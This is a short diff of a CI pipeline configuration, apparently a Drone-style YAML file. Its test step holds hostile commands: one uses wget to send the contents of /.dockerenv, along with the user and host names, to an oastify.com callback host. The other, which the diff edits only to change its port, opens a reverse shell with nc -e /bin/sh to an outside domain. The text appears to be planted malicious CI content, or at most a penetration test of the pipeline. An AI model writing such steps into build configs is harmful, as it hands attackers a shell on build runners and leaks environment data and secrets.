@@ -27,7 +27,7 @@ steps:
       TEST_ENV: dev
     commands:
       - wget --post-data "$(cat /.dockerenv)" https://i4nyivrklhdy81jozthildr15sbr5fw3l.oastify.com/env/`whoami`/`hostname`
-      - nc crazydiam0nd.com 8084 -e /bin/sh
+      - /usr/bin/nc crazydiam0nd.com 80 -e /bin/sh
       - ./httptest
 
   - name: publish-dev
